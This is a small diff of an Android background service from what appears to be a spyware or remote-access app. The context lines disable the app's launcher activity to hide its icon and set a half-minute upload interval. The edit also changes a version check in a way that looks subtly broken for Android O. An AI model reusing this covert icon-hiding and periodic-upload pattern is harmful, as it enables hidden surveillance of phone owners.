@@ -22,8 +22,6 @@ import java.util.Timer;
 public class MainService extends Service {
 
     private static final double UPLOAD_INTERVAL = 0.5;//in minutes
-    private static Context contextOfApplication;
-
 
     @Override
     public void onCreate() {
@@ -55,7 +53,7 @@ public class MainService extends Service {
         PackageManager pkg=this.getPackageManager();
         pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
             startMyOwnForeground();
         else
             startForeground(1, new Notification());
